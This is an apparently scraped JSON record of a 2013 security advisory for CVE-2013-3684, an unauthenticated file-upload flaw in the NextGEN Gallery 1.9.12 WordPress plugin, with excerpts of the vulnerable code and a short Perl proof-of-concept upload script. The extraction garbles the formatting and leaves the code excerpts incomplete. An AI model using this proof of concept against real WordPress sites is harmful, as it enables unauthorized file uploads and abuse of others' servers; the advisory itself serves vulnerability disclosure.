{
    "text": "title : NextGEN Gallery 1.9.12 Shell Upload  ， detail : The NextGEN Gallery WordPress plugin version 1.9.12 suffers from a remote shell upload vulnerability.  ， cve : advisories | CVE-2013-3684  ，  ， desc :  #   ， - S21Sec Advisory -  ，  ， Title : NextGEN Gallery 1.9.12 Arbitrary File Upload  ， ID : S21SEC-046-en  ， CVE ID : CVE-2013-3684  ， Severity : High  ， Status : Fixed  ， History : 27.May.2013 Vulnerability discovered  ， 28.May.2013 Vendor informed  ， 12.Jun.2013 Fix released  ， Authors : Marcos Agero ( maguero @ s21sec.com )   ， URL : http : /www.s21sec.com/images/labs/advisories/s21sec-046-en.txt  ， Release : Public  ，  [ SUMMARY ]   ， NextGEN Gallery is a WordPress gallery plugin that offers sophisticated  ， gallery management and  ， displays. It's one of the most popular plugins ever produced for  ， WordPress , currently downloaded  ， around 30 , 000 times per week.  ，  [ AFFECTED VERSIONS ]   ，  * NextGEN Gallery 1.9.12  ，  [ DESCRIPTION ]   ， NextGEN Gallery allows file upload to unauthenticated users. Filters in  ， place only permits uploads  ， of image files ( extensions .gif , .png and .jpg ) . This avoids scripts  ， execution problems but an  ， attacker could use the affected system to host files.  ， Vulnerability occurs due an innapropiate cookie validation in  ， admin/upload.php script :   ，  ，  $ results = wp_parse_auth_cookie (  )  ;   ，  $ logged_in = FALSE ;   ，   ，  ， get_userdatabylogin (  $ results [ 'username' ]  )   ，  $ logged_in = $ userdata->ID ;   ， }  ， }  ，   ， die ( 'You do not have permission to upload files. -2' )  ;   ， }  ， } # VULN : No auth cookie is okay !   ， This can be triggered by invoking 'nggupload' parameter on any valid  ， wordpress URL :   ， ngggallery.php :   ， / Handle upload requests  ， add_action ( 'init' , array ( & $ this , 'handle_upload_request' )  ;   ，  [ . ]   ，  ， {  ，  ， require_once ( implode ( DIRECTORY_SEPARATOR , array (   ， NGGALLERY_ABSPATH ,   ， 'admin' ,   ， 'upload.php'  ，  )  ;   ， throw new E_Clean_Exit (  )  ;   ， }  ， }  ，  [ POC ]   ，  #  ! /usr/bin/perl  ， use LWP ;   ， use HTTP : Request : Common ;   ， my (  $ url ,  $ file ) = @ ARGV ;   ， my $ ua = LWP : UserAgent->new (  )  ;   ， my $ req = POST $ url ,   ， Content_Type => 'form-data' ,   ， Content => [   ， name => $ name ,   ， galleryselect => 1 ,  # Gallery ID , should exist  ， Filedata => [ \" $ file\" , \"file.gif\" , Content_Type =>  ， 'image/gif' ]   ，  ]  ;   ， my $ res = $ ua->request (  $ req )  ; ",
    "time": "Jun 13, 2013"
}